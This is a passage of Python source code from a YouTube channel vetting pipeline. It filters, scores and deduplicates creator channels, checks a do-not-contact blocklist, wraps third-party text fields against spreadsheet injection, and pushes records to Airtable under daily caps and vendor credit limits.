            round(uploads_per_year, 1) if uploads_per_year is not None else "unknown",
            days_since if days_since is not None else "unknown",
            performance.get("content_language") or "unset",
        )
        return None, drop_reason

    # Search zone. Free — both of resolve_country's sources come out of
    # data already fetched, so this costs no extra call and no page load.
    #
    # A None verdict means the channel declares no country we can read, and
    # is deliberately KEPT — absent data is not evidence against a channel,
    # the same rule qualify() applies to an unknown channel age. Only a
    # positively-outside country is discarded.
    country = resolve_country(stats, performance)
    if zone_verdict(country) is False:
        logger.info(
            "Dropping %s before push — %s (country: %s).",
            stats.get("channel_title"), DROP_OUTSIDE_SEARCH_ZONE, country,
        )
        return None, DROP_OUTSIDE_SEARCH_ZONE

    # Long-form floor, LAST of the discard gates because it is the only one
    # that can cost quota: confirming 30 non-Shorts uploads may need up to
    # LONGFORM_SCAN_MAX_PAGES extra pages (2 units each) for a channel whose
    # newest 50 videos didn't already show them. Every free reason to discard
    # has now had its turn, so nothing is paged for a candidate that was
    # going to be dropped anyway.
    longform_count = performance.get("longform_count", 0)
    if longform_count < MIN_LONGFORM_VIDEO_COUNT:
        longform_count = count_longform_in_older_videos(
            channel_id,
            stats.get("uploads_playlist_id", ""),
            performance.get("next_page_token", ""),
            already_counted=longform_count,
            target=MIN_LONGFORM_VIDEO_COUNT,
        )
    drop_reason = longform_drop_reason(longform_count)
    if drop_reason:
        logger.info(
            "Dropping %s before push — %s (%d confirmed non-Shorts of %s total videos).",
            stats.get("channel_title"), drop_reason, longform_count, stats.get("video_count"),
        )
        return None, drop_reason

    # upload_freq was computed once above the pre-push gate (the cadence
    # check needs it) and is reused here rather than recomputed.
    fake_risk = calc_fake_follower_risk(
        stats["subscriber_count"], performance["avg_views"], performance["avg_engagement_rate"]
    )
    overall_score = calc_overall_score(
        stats["subscriber_count"],
        performance["avg_views"],
        performance["avg_engagement_rate"],
        upload_freq,
        fake_risk,
        DEFAULT_NICHE_MATCH,
    )

    # Age is the only qualification question left — the view floor, the
    # video-count floor and the search zone are all hard gates above, so a
    # candidate that reaches here has already passed them.
    qualification = qualify(
        channel_age_months(stats.get("published_at", "")),
        niche_config["min_channel_age_months"],
    )

    email = resolve_email(stats, performance, scraper, enricher)

    # Checkpoint 3 — catches agency addresses shared across channels.
    if email:
        hit = blocklist.match(email=email)
        if hit:
            logger.info("BLOCKED %s — DO NOT CONTACT (%s).", stats.get("channel_title"), hit)
            return None, "blocked"

    # csv_safe() is applied to the FREE-TEXT fields only — see its docstring
    # for why (the reviewer exports this view to CSV and opens it in Excel).
    # Which fields are excluded, and why, matters as much as which are
    # wrapped; each exclusion is noted at its line below.
    record = {
        # Attacker-controlled: whatever the channel owner typed.
        "Channel Name": csv_safe(stats["channel_title"]),
        # NOT wrapped: "Channel URL" and "Channel ID" are matched on EXACTLY
        # elsewhere. Channel ID in particular is the dedupe key
        # airtable_client.channel_exists() looks up by, so a leading
        # apostrophe would make every existing row invisible to the lookup
        # and the pipeline would re-POST duplicates instead of PATCHing.
        # Neither field can carry a payload anyway: both are derived from a
        # YouTube channel ID, which is a fixed-alphabet "UC..." string.
        "Channel URL": f"https://www.youtube.com/channel/{channel_id}",
        "Channel ID": channel_id,
        # NOT wrapped: numeric fields. Airtable's Number fields reject
        # strings, and csv_safe() passes non-strings through untouched
        # precisely so that a mistake here fails loudly rather than being
        # papered over.
        "Subscriber Count": stats["subscriber_count"],
        "Avg Views (last 10 videos)": round(performance["avg_views"], 1),
        "Engagement Rate": round(performance["avg_engagement_rate"], 2),
        # "Upload Frequency" is a text field in Airtable (not Number) — it
        # rejects raw JSON numbers, so this must be sent as a string.
        # Rounded to a whole number for display; the unrounded value is
        # still what feeds calc_overall_score above.
        #
        # NOT wrapped: this string is built here and always starts with a
        # digit, so csv_safe() would be a guaranteed no-op. Harmless either
        # way; left off so the wrapped fields are exactly the ones carrying
        # third-party text.
        "Upload Frequency": f"{round(upload_freq)} videos/month",
        # Best-effort: most creators never set defaultAudioLanguage/
        # defaultLanguage on their videos, so this is frequently "Unknown".
        # Channel *country* (stats["country"]) is a separate signal and is
        # deliberately not used here, since it isn't the same thing as the
        # content's spoken language.
        #
        # Wrapped: it's a free-text field echoing a value the channel owner
        # set on their videos.
        "Content Language": csv_safe(performance.get("content_language") or "Unknown"),
        # Attacker-influenced: chain step 5 (browser_email.py) reads
        # arbitrary third-party websites for this.
        "Email": csv_safe(email),
        "Fake Follower Risk Score": fake_risk,
        "Overall Score": overall_score,
        # NOT wrapped: Single Select values that must match an existing
        # Airtable option EXACTLY. push_record sends typecast=True, which
        # silently CREATES a missing option rather than erroring — so a
        # mangled "'Qualified" would quietly mint a new option and drop the
        # row out of the reviewer's saved views. Both values are ours
        # (scoring.py / config.py), not third-party text.
        "Qualification": qualification,
        "Status": DEFAULT_STATUS,
        # Wrapped for consistency rather than out of fear: the keywords are
        # our own NICHES entries, so the risk is low, but it is still a text
        # field assembled from data and there is no reason to leave the one
        # free-text field uncovered.
        "Source": csv_safe(f"{SOURCE_LABEL} ({', '.join(candidate.get('matched_keywords', []))})"),
        "Notes": "",
        # NOT wrapped: a date value from prospect_day.today_iso(), not text.
        "Date Added": today_iso(),
    }
    return record, qualification


def _discovery_exclude_handles(blocklist, external_handles, seen_handles) -> set[str]:
    """
    Assemble the discovery exclude set, PRIORITISED under the 10k cap.

    The order is deliberate, and DO NOT CONTACT comes first because it is the
    exclusion that matters most: a creator on the suppression list is going to
    be dropped by process_candidate's blocklist checkpoints no matter what, so
    any discovery credit spent surfacing them is pure waste — and excluding
    them server-side also means they never appear in results a reviewer sees.
    So the blocklist's handles are never dropped to make room.

    `seen_handles` (creators already examined THIS run) come next, so a later
    round never re-bills an earlier round's candidates. External-table handles
    fill whatever room is left under the cap; the ones that don't fit are still
    caught after enrichment by process_candidate's external-handle check — at
    the cost of one channels.list unit each, not a wrong contact.

    The blocklist screening in process_candidate is unchanged and remains the
    authoritative, fail-closed suppression gate (it also matches on email and
    name, which a handle-only exclusion can't). This set is a cost-saver layered
    in front of it, never a replacement for it.
    """
    must_keep = set(blocklist.handles) | set(seen_handles)
    room = max(0, INFLUENCERS_MAX_EXCLUDE_HANDLES - len(must_keep))
    external = sorted(set(external_handles) - must_keep)[:room]
    return must_keep | set(external)


def _run_discovery_rounds(
    niche_name: str,
    table_name: str,
    niche_config: dict,
    discovery,
    globally_tracked_ids: set[str],
    external_handles: dict[str, str],
    blocklist,
    scraper,
    enricher,
    qualified_headroom: int,
    flagged_headroom: int,
) -> dict:
    """
    Fill a niche's daily budget from influencers.club discovery instead of
    search.list. Same refill shape as run_niche's keyword loop, with two
    differences that follow from the source:

      - the round's batch is a target creator COUNT handed to
        discovery.discover() (which paginates the endpoint internally), not a
        batch of keywords, and
      - dedupe is by @handle, because discovery returns a handle rather than a
        channel ID. exclude_handles asks the vendor to withhold creators
        already in the base so they are never returned — and, at 0.01 credits
        each, never billed.

    Returns the same counters run_niche tracks:
    {qualified, flagged, discovered, skipped, pushed_ids}.
    """
    pushed_qualified = 0
    pushed_flagged = 0
    total_discovered = 0
    total_skipped = 0
    pushed_ids: set[str] = set()

    logger.info("Discovery source for '%s': influencers.club creator search.", niche_name)
    # The exclude set is assembled per round (see _discovery_exclude_handles):
    # DO NOT CONTACT handles first and never dropped, then this run's seen
    # handles, then external-table handles filling the 10k cap. The niche
    # tables store a Channel ID, not a handle, so their own rows aren't
    # excluded server-side — the post-enrichment channel_id dedupe below
    # (known_channel_ids) is the backstop for a re-discovered niche-table
    # channel, at the cost of the 1-unit channels.list to resolve it.
    filters = niche_config["discovery_filters"]
    seen_handles: set[str] = set()
    rounds = 0

    while True:
        # Same "one opportunistic round for flagged once qualified is full"
        # rule as the keyword loop — the flagged budget is a ceiling, never a
        # target, and for a niche whose min_channel_age_months is None it can
        # never fill, so it must not drive the loop.
        if rounds and pushed_qualified >= qualified_headroom:
            break
        rounds += 1
        if rounds > DISCOVERY_MAX_ROUNDS:
            logger.warning(
                "'%s' hit the discovery round cap (%d) — stopping.",
                niche_name, DISCOVERY_MAX_ROUNDS,
            )
            break

        rows_wanted = (qualified_headroom - pushed_qualified) + (flagged_headroom - pushed_flagged)
        # Oversized against the gate survival rate, exactly as the keyword
        # loop oversizes its candidate batch; the loop itself is what
        # guarantees the budget fills, so this only affects round count.
        target = max(1, int(rows_wanted * CANDIDATE_OVERSHOOT))

        candidates = discovery.discover(
            filters=filters,
            target=target,
            exclude_handles=_discovery_exclude_handles(blocklist, external_handles, seen_handles),
            source_label=f"influencers.club discovery ({niche_name})",
        )
        new_candidates = [c for c in candidates if c["handle"] not in seen_handles]
        total_discovered += len(new_candidates)
        logger.info(
            "Discovery round for '%s': asked for %d, got %d new candidate(s).",
            niche_name, target, len(new_candidates),
        )
        if not new_candidates:
            logger.info("Discovery is dry for '%s' — stopping.", niche_name)
            break

        counts = push_until_full(
            new_candidates,
            lambda c: process_candidate(
                c, external_handles, blocklist, niche_config, scraper, enricher,
                known_channel_ids=globally_tracked_ids | pushed_ids,
            ),
            table_name,
            qualified_headroom - pushed_qualified,
            flagged_headroom - pushed_flagged,
        )
        pushed_qualified += counts["qualified"]
        pushed_flagged += counts["flagged"]
        total_skipped += counts["skipped"]
        pushed_ids |= counts["pushed_ids"]
        seen_handles.update(c["handle"] for c in new_candidates)

        logger.info(
            "'%s' so far: %d/%d qualified, %d/%d flagged (%.2f discovery credits spent).",
            niche_name, pushed_qualified, qualified_headroom,
            pushed_flagged, flagged_headroom, discovery.credits_spent,
        )

    return {
        "qualified": pushed_qualified,
        "flagged": pushed_flagged,
        "discovered": total_discovered,
        "skipped": total_skipped,
        "pushed_ids": pushed_ids,
    }


def run_niche(
    niche_name: str,
    table_name: str,
    keywords: list[str],
    max_results_per_keyword: int,
    days_back: int,
    globally_tracked_ids: set[str],
    external_handles: dict[str, str],
    blocklist,
    niche_config: dict,
    scraper,
    enricher=None,
    discovery=None,
) -> tuple[int, int, set[str], bool]:
    """
    Run discovery -> pre-filter -> enrich -> score -> push for one niche's
    table. `globally_tracked_ids` is the base-wide dedupe set (union of
    every niche table's Channel IDs, not just this one) — a candidate
    already tracked in ANY niche's table is skipped here too, so a
    channel is claimed by whichever niche discovers it first rather than
    being trackable in more than one table.

    Returns (discovered_count, processed_count, newly_tracked_ids,
    cap_check_completed) — the caller merges newly_tracked_ids into the
    shared dedupe set so a later niche in the same run also sees channels
    just pushed by this one.

    cap_check_completed is True iff this niche's daily-cap check
    (count_added_today) actually ran and succeeded — regardless of
    whether it turned out the niche was already at cap. It is False when
    the niche was skipped for a reason that says nothing about today's
    cap (no table configured, a misconfigured NICHES entry, or an
    unreadable Airtable count). run() uses this to tell "every niche is
    legitimately full today" (a real no-op) apart from "nothing could be
    checked" (a run that silently did nothing) — see IMPORTANT 3 in the
    fix-wave review.
    """
    if not table_name:
        logger.error(
            "No Airtable table configured for niche '%s' — set the matching env var. Skipping this niche.",
            niche_name,
        )
        return 0, 0, set(), False

    # Read the niche's qualification criteria ONCE, here, rather than
    # indexing niche_config[...] inside process_candidate (which runs
    # once per candidate). Checked with "in" rather than truthiness:
    # min_channel_age_months legitimately holds None for niches with no
    # age requirement (e.g. Lifestyle Sofa), so its presence — not its
    # value — is what a misconfigured NICHES entry would get wrong.
    # Failing fast here means a bad config skips this niche instead of
    # raising a KeyError mid-niche and killing the whole run.
    if "min_avg_views" not in niche_config or "min_channel_age_months" not in niche_config:
        logger.error(
            "Niche '%s' is missing 'min_avg_views' or 'min_channel_age_months' in its NICHES "
            "config — skipping this niche rather than crashing partway through.",
            niche_name,
        )
        return 0, 0, set(), False

    logger.info("=== Niche: %s (table: %s) ===", niche_name, table_name)

    try:
        qualified_today = count_added_today(table_name, QUALIFIED)
        flagged_today = count_added_today(table_name) - qualified_today
    except AirtableReadError as e:
        logger.error("Cannot read today's counts for '%s' (%s) — skipping niche.", niche_name, e)
        return 0, 0, set(), False

    qualified_headroom = max(0, DAILY_QUALIFIED_CAP - qualified_today)
    flagged_headroom = max(0, DAILY_FLAGGED_CAP - flagged_today)
    logger.info(
        "'%s': %d/%d qualified and %d/%d flagged already added today.",
        niche_name, qualified_today, DAILY_QUALIFIED_CAP, flagged_today, DAILY_FLAGGED_CAP,
    )
    if qualified_headroom == 0 and flagged_headroom == 0:
        logger.info("'%s' is already at its daily cap — skipping (no quota spent).", niche_name)
        return 0, 0, set(), True

    # --- Refill loop --------------------------------------------------
    # Discover a batch of keywords, push what survives, and come back for
    # more while the QUALIFIED budget has room and keywords remain (see the
    # loop condition below for why flagged doesn't drive this).
    #
    # This used to be a single pass: discover
    # (headroom * CANDIDATE_OVERSHOOT) candidates once, push, done. That
    # worked while almost every candidate became a row, but the 2026-08
    # criteria change moved the view floor, the video-count floor and the
    # search zone into pre_push_drop_reason() as hard DISCARDS — measured,
    # only ~15% of fresh candidates now survive to be written (18 of 122 on
    # 2026-08-11). So a 40-row budget was handed 60 candidates, produced ~9
    # rows, and stopped with 6 of 9 keywords never searched. The cap was
    # unreachable by construction, and the only symptom was the
    # "finished under its qualified budget" warning below, which reads as
    # "discovery is running dry" — the wrong diagnosis, since the keywords
    # had plenty left.
    #
    # Refilling makes the loop self-correcting in both directions: a bad
    # survival rate keeps searching, and a good one stops early, so quota
    # still tracks what the day's headroom actually needs.
    pushed_qualified = 0
    pushed_flagged = 0
    total_discovered = 0
    total_skipped = 0
    pushed_ids: set[str] = set()

    # Discovery source selection. When an influencers.club key is configured
    # (discovery.enabled) and this niche carries discovery_filters, creator
    # search REPLACES the keyword loop below: it filters on the niche's
    # criteria server-side, so a far larger fraction of what it returns
    # survives the gates than raw YouTube search does. With no key — or a
    # niche without filters — control falls straight through to the keyword
    # loop, so the pipeline still runs when influencers.club is unavailable.
    use_discovery = (
        discovery is not None and discovery.enabled and "discovery_filters" in niche_config
    )
    if use_discovery:
        d = _run_discovery_rounds(
            niche_name, table_name, niche_config, discovery,
            globally_tracked_ids, external_handles, blocklist, scraper, enricher,
            qualified_headroom, flagged_headroom,
        )
        pushed_qualified = d["qualified"]
        pushed_flagged = d["flagged"]
        total_discovered = d["discovered"]
        total_skipped = d["skipped"]
        pushed_ids = d["pushed_ids"]

    # Local copy — the caller's set is shared across niches and must not be
    # mutated here. Grows with every candidate this niche has ALREADY
    # examined (pushed or dropped), so a later batch never re-enriches a
    # channel an earlier one already paid for. Emptied when discovery already
    # ran, so the keyword loop below is skipped entirely in that mode.
    seen_ids = set(globally_tracked_ids)
    remaining_keywords = [] if use_discovery else list(keywords)
    rounds = 0

    while remaining_keywords:
        # Only the QUALIFIED budget is worth spending another 100-unit
        # search on. The flagged budget is a CEILING, not a target — it
        # exists so a weak discovery day can't crowd the table with
        # below-criteria channels, so flagged rows are written
        # opportunistically as they turn up and never hunted for. Chasing it
        # would also never terminate for a niche that cannot produce one at
        # all: Lifestyle Sofa's min_channel_age_months is None, so qualify()
        # can only ever return "Qualified" there and its flagged budget goes
        # permanently unused (documented, expected). A loop that kept
        # searching until flagged filled would burn every keyword in that
        # niche, every day, for rows that can't exist.
        #
        # Tested after at least one round, so a niche whose qualified budget
        # is already full still gets a single opportunistic pass for flagged.
        if rounds and pushed_qualified >= qualified_headroom:
            break
        rounds += 1

        rows_wanted = (qualified_headroom - pushed_qualified) + (flagged_headroom - pushed_flagged)
        # How many keywords to search this round. Ceiling division, floor of
        # 1, so a small shortfall still searches one keyword rather than
        # zero (which would spin the loop without spending or progressing).
        wanted_candidates = max(1, int(rows_wanted * CANDIDATE_OVERSHOOT))
        batch_size = max(
            1,
            -(-wanted_candidates // max(1, EXPECTED_CANDIDATES_PER_KEYWORD)),
        )
        batch = remaining_keywords[:batch_size]
        remaining_keywords = remaining_keywords[batch_size:]

        logger.info(
            "Discovery round for '%s': %d keyword(s) %s — %d row(s) still wanted.",
            niche_name, len(batch), batch, rows_wanted,
        )
        # target_fresh is deliberately NOT passed: the batch was already
        # sized to the shortfall, and stopping part-way through it would
        # consume keywords from remaining_keywords without searching them.
        discovered = run_discovery(
            batch,
            max_results_per_keyword=max_results_per_keyword,
            days_back=days_back,
            exclude_ids=seen_ids,
        )
        total_discovered += len(discovered)
        logger.info("Discovered %d unique candidate channel(s).", len(discovered))

        # Straight set-membership filter, deliberately not a DataFrame: a
        # round trip through pandas rewrote the candidates on the way out —
        # it appended its own bookkeeping column to every record and filled a
        # NaN wherever one candidate carried a key another lacked (which also
        # promoted that column's ints to floats). Nothing downstream wanted
        # either.
        if not discovered:
            logger.info("No candidates discovered — nothing to process.")
        new_candidates = [c for c in discovered if c["channel_id"] not in seen_ids]

        logger.info(
            "%d candidate(s) already tracked or already examined, %d remaining to process.",
            len(discovered) - len(new_candidates), len(new_candidates),
        )

        counts = push_until_full(
            new_candidates,
            lambda c: process_candidate(
                c, external_handles, blocklist, niche_config, scraper, enricher
            ),
            table_name,
            qualified_headroom - pushed_qualified,
            flagged_headroom - pushed_flagged,
        )

        pushed_qualified += counts["qualified"]
        pushed_flagged += counts["flagged"]
        total_skipped += counts["skipped"]
        pushed_ids |= counts["pushed_ids"]
        # Every candidate offered to push_until_full is now spent, whether it
        # was written or dropped. push_until_full only returns before reading
        # its whole list when BOTH budgets are full, which also ends this
        # loop — so nothing unexamined is being discarded here.
        seen_ids.update(c["channel_id"] for c in new_candidates)

        logger.info(
            "'%s' so far: %d/%d qualified, %d/%d flagged (%d keyword(s) left).",
            niche_name, pushed_qualified, qualified_headroom,
            pushed_flagged, flagged_headroom, len(remaining_keywords),
        )

    logger.info(
        "'%s': pushed %d qualified, %d flagged, skipped %d.",
        niche_name, pushed_qualified, pushed_flagged, total_skipped,
    )

    if not use_discovery and pushed_qualified < qualified_headroom:
        logger.warning(
            "'%s' finished under its qualified budget (%d of %d) with every keyword "
            "searched. Discovery really is running dry for these keywords — widen "
            "--days-back for a one-off sweep, or add keywords from the brief's "
            "secondary content types.",
            niche_name, pushed_qualified, qualified_headroom,
        )

    return total_discovered, pushed_qualified + pushed_flagged, pushed_ids, True


# A NICHES entry missing any of these crashes run() with a bare KeyError
# (table_name/keywords, indexed directly in run() before run_niche() is
# even called) or run_niche() itself (min_avg_views/min_channel_age_months,
# checked there — see its docstring). Checking all four here, up front,
# means a bad config skips just that niche instead of killing the whole
# run partway through.
REQUIRED_NICHE_KEYS = ("table_name", "keywords", "min_avg_views", "min_channel_age_months")


def run(niches: dict, max_results_per_keyword: int, days_back: int) -> None:
    try:
        blocklist = fetch_blocklist()
    except BlocklistUnavailable as e:
        logger.error("ABORTING: %s", e)
        raise SystemExit(1)

    # Global (base-wide) dedupe: fetched once across every niche's table
    # before any niche runs, so a channel already tracked anywhere in the
    # base — not just in the niche currently being processed — is skipped.
    # get_existing_channel_ids() raises AirtableReadError rather than
    # returning a partial set on a mid-pagination failure (a 429 on page 7
    # of 14, say); a partial set here would make already-tracked channels
    # look fresh and get re-pushed, reverting reviewer Status/Notes (see
    # IMPORTANT 2 in the fix-wave review). Abort the whole run rather than
    # proceed on a set we can't trust, mirroring the blocklist abort above.
    globally_tracked_ids: set[str] = set()
    try:
        for niche_config in niches.values():
            if niche_config.get("table_name"):
                globally_tracked_ids |= get_existing_channel_ids(niche_config["table_name"])
    except AirtableReadError as e:
        logger.error("ABORTING: cannot establish the existing-channel-ID dedupe set (%s).", e)
        raise SystemExit(1)

    # Handles already tracked in the base's other YouTube outreach/leads/
    # influencer tables (see external_dedupe.py) — cached, so this is
    # near-instant on any run within EXTERNAL_CACHE_MAX_AGE_HOURS of the
    # last one.
    external_handles = fetch_external_handles()

    total_discovered = 0
    total_processed = 0
    # Whether ANY niche actually completed its daily-cap check this run
    # (see run_niche()'s cap_check_completed return value). An expired
    # Airtable token, or a NICHES dict where every entry is missing a
    # required key, would otherwise skip every niche and still exit 0 —
    # a daily scheduled job silently doing nothing forever. See IMPORTANT 3.
    any_cap_check_completed = False

    # Email chain step 4. One client per run so the lookup budget and the
    # credit-cap breaker are scoped to the run, and inert when no API key
    # is set — the same soft-disable contract as null_scraper() below.
    enricher = InfluencersClient.from_config()
    # Said out loud for the same reason the browser warning below is. This is
    # the only step that costs money, and from_config() logs only when the key
    # is ABSENT — so a live run was otherwise silent about whether step 4 ran
    # at all, which is indistinguishable from it running and finding nothing.
    if enricher.enabled:
        logger.info("Email chain step 4 is live (influencers.club enrichment).")

    # Discovery source, one client per run so its credit ceiling is run-scoped.
    # Inert when no API key is set, in which case run_niche falls back to the
    # YouTube search.list keyword loop — so the pipeline still runs without it.
    discovery = InfluencerDiscovery.from_config()
    if discovery.enabled:
        logger.info("Discovery source: influencers.club creator search (replacing search.list).")
    else:
        logger.info("influencers.club discovery unavailable — discovery falls back to YouTube search.list.")

    scraper = BrowserEmailScraper.launch() if USE_PLAYWRIGHT_STEALTH else null_scraper()
    # launch() fails SOFT — a missing Chromium binary, a missing shared
    # library, or an unimportable playwright all return an inert scraper
    # rather than raising, so the run continues with email chain step 5
    # silently doing nothing. That is the right behaviour (one email source
    # is not worth killing a run over) but it is invisible: the symptom is
    # simply fewer emails, on a metric nobody watches per-run. Say it out
    # loud instead, since "USE_PLAYWRIGHT_STEALTH is set" and "the browser
    # actually started" are different facts and only the second one matters.
    if USE_PLAYWRIGHT_STEALTH and not scraper.enabled:
        logger.warning(
            "USE_PLAYWRIGHT_STEALTH is on but the browser could not start — email "
            "chain step 5 (linked site / contact page) is doing nothing this run. "
            "On CI this usually means the 'Install Chromium for Playwright' step "
            "was skipped; locally, run: python -m playwright install chromium"
        )
    elif USE_PLAYWRIGHT_STEALTH:
        logger.info("Browser email step is live (Playwright + stealth).")

    try:
        for niche_name, niche_config in niches.items():
            missing_keys = [key for key in REQUIRED_NICHE_KEYS if key not in niche_config]
            if missing_keys:
                logger.error(
                    "Niche '%s' is missing required NICHES key(s) %s — skipping this niche "
                    "rather than crashing the whole run.",
                    niche_name, missing_keys,
                )
                continue

            discovered, processed, newly_tracked_ids, cap_check_completed = run_niche(
                niche_name,
                niche_config["table_name"],
                niche_config["keywords"],
                max_results_per_keyword,
                days_back,
                globally_tracked_ids,
                external_handles,
                blocklist,
                niche_config,
                scraper,
                enricher,
                discovery,
            )
            total_discovered += discovered
            total_processed += processed
            any_cap_check_completed = any_cap_check_completed or cap_check_completed
            # So a later niche in this same run also sees channels this one
            # just pushed, rather than only picking up prior runs' state.
            globally_tracked_ids |= newly_tracked_ids
    finally:
        scraper.close()

    quota_used = get_today_spend()
    print("\n--- Run summary ---")
    print(f"Total discovered:  {total_discovered}")
    print(f"Total processed:   {total_processed}")
    print(f"Quota used today:  {quota_used} / {DAILY_QUOTA_BUDGET}")
    # An upper bound on credits, not a count of them: a lookup that found
    # no address was free (see influencers.py). Reported because a credit
    # spend nobody watches per-run is exactly how a budget gets a surprise.
    if enricher.lookups_spent:
        print(
            f"influencers.club:  {enricher.lookups_spent} billable lookup(s), "
            f"{enricher.credits_reported:g} credits reported by the vendor"
        )
    # Discovery credits are the exact figure the vendor billed (credits_cost),
    # not an upper bound — every returned creator is charged, unlike an enrich
    # miss which is free.
    if discovery.credits_spent:
        print(f"discovery credits: {discovery.credits_spent:g} spent on creator search")

    if not any_cap_check_completed:
        logger.error(
            "No niche completed its daily-cap check this run — every niche was skipped for "
            "a non-cap reason (missing NICHES config, no table configured, or an unreadable "
            "Airtable count). Exiting non-zero so a scheduled run that did nothing is never "
            "reported as green."
        )
        raise SystemExit(1)


def main() -> None:
    global DAILY_QUALIFIED_CAP, DAILY_FLAGGED_CAP

    parser = argparse.ArgumentParser(description="YouTube channel vetting pipeline")
    parser.add_argument(
        "--test",
        action="store_true",
        help="Run a cheap end-to-end smoke test: 1 keyword, max_results=5, first niche only.",
    )
    parser.add_argument(
        "--daily-cap",
        type=int,
        default=None,
        help=(
            "Override both DAILY_QUALIFIED_CAP and DAILY_FLAGGED_CAP for this run, so the "
            "capping path can be tested cheaply against production Airtable without also "
            "leaving the flagged budget at its full (10/day) size."
        ),
    )
    parser.add_argument(
        "--days-back",
        type=int,
        default=DISCOVERY_DAYS_BACK,
        help="How many days back to search for videos. Defaults to DISCOVERY_DAYS_BACK "
             "(7). Pass a larger value for a one-off backlog sweep, e.g. --days-back 90.",
    )
    args = parser.parse_args()

    if args.daily_cap is not None:
        DAILY_QUALIFIED_CAP = args.daily_cap
        DAILY_FLAGGED_CAP = args.daily_cap

    if args.test:
        # Bound the daily caps too, not just max_results. max_results only
        # limits the search.list FALLBACK path; when influencers.club discovery
        # is active it ignores max_results and fills the daily cap, so without
        # this a --test run would discover, enrich, and push toward a full
        # 30-row day (real credits, real quota, real rows) instead of a cheap
        # smoke test. A caller who wants a specific size can still pass
        # --daily-cap, which takes precedence.
        if args.daily_cap is None:
            DAILY_QUALIFIED_CAP = 2
            DAILY_FLAGGED_CAP = 1
        logger.info(
            "Running in --test mode: first niche only, max_results=5, capped to "
            "%d qualified / %d flagged (bounds discovery spend too).",
            DAILY_QUALIFIED_CAP, DAILY_FLAGGED_CAP,
        )
        first_niche_name = next(iter(NICHES))
        first_niche = NICHES[first_niche_name]
        test_niches = {first_niche_name: {**first_niche, "keywords": first_niche["keywords"][:1]}}
        run(niches=test_niches, max_results_per_keyword=5, days_back=args.days_back)
    else:
        run(niches=NICHES, max_results_per_keyword=50, days_back=args.days_back)


if __name__ == "__main__":
    main()
